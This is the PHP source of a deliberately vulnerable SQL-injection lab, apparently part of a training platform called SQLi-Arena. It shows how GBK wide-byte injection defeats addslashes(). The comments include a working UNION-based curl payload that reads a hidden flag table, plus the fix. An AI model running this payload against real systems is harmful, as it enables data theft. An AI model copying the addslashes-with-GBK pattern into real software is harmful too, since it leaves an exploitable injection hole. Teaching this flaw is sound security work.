<?php
/*
 * SQLi-Arena. MySQL Lab 20: WAF Bypass. GBK Wide Byte Injection
 * SOURCE CODE (shown in White-Box mode)
 *
 * This lab demonstrates bypassing addslashes() using GBK multi-byte character encoding.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// CRITICAL: The connection charset is set to GBK
// This enables the wide-byte injection attack
mysqli_set_charset($conn, 'gbk');
mysqli_query($conn, "SET NAMES 'gbk'");

// Get user input
$raw_input = $_GET['username'];

// "Security" measure: addslashes() escapes quotes by adding a backslash
// ' becomes \'   (0x27 becomes 0x5C 0x27)
// " becomes \"   (0x22 becomes 0x5C 0x22)
// \ becomes \\   (0x5C becomes 0x5C 0x5C)
$escaped = addslashes($raw_input);

// ❌ VULNERABLE: addslashes() + GBK charset = wide-byte bypass
// When the connection uses GBK, MySQL interprets multi-byte sequences.
// 0xBF5C is a valid GBK character. If an attacker sends 0xBF before a quote:
//   Input:      0xBF 0x27         (0xBF followed by a single quote)
//   addslashes: 0xBF 0x5C 0x27   (backslash added before the quote)
//   MySQL sees: [0xBF5C] 0x27    (0xBF5C = valid GBK char, 0x27 = unescaped quote!)
$query = "SELECT username, email FROM users WHERE username = '$escaped'";

$result = mysqli_query($conn, $query);

while ($row = mysqli_fetch_assoc($result)) {
    echo "Username: {$row['username']} | Email: {$row['email']}";
}

// Hidden table structure:
// CREATE TABLE secret_data (id INT, secret VARCHAR(100));
// Contains: secret='FLAG{...}'
//
// Wide-byte attack:
//   curl "URL?username=%bf%27+UNION+SELECT+secret,2+FROM+secret_data+--+-"
//
// Byte-level breakdown:
//   %bf%27 = 0xBF 0x27
//   addslashes() → 0xBF 0x5C 0x27 (adds \ before ')
//   MySQL GBK  → [縗] ' (0xBF5C is the GBK character 縗, quote is free)
//
// The query becomes:
//   SELECT username, email FROM users WHERE username = '縗' UNION SELECT secret,2 FROM secret_data -- -'
//
// DEFENSE: Use mysqli_real_escape_string() (charset-aware) or better yet, prepared statements.
// addslashes() is NOT charset-aware and should NEVER be used for SQL escaping.
